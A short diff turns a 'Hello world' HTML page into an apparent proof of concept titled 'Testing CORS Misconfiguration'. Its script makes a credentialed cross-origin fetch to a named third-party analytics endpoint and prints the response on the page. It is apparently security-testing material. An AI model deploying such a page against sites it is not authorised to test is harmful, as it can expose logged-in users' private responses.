@@ -1,5 +1,20 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    Hello world!
-  </body>
+<body>
+<h1>Testing CORS Misconfiguration</h1>
+
+<script>
+    fetch("https://analytic.lookatme.com.ph/g/collect?v=2", {
+        credentials: "include"
+    })
+    .then(response => response.text())
+    .then(data => {
+        document.body.innerHTML += "<pre>" + data + "</pre>";
+    })
+    .catch(err => {
+        document.body.innerHTML += "<pre>Error: " + err + "</pre>";
+    });
+</script>
+
+</body>
 </html>
